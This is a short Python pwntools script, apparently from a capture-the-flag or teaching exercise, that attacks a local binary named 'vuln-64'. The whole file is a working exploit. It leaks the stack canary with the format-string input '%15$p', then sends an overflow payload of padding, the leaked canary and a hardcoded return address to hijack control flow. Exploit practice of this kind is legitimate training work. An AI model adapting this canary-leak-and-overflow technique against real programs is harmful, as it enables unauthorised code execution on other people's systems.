from pwn import *

p = process('./vuln-64')

log.info(p.clean())
p.sendline(b'%15$p')
canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

payload = b'x'*72 + p64(canary) + b'x'*8 + p64(0x004011ec) + p64(0x0)

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())
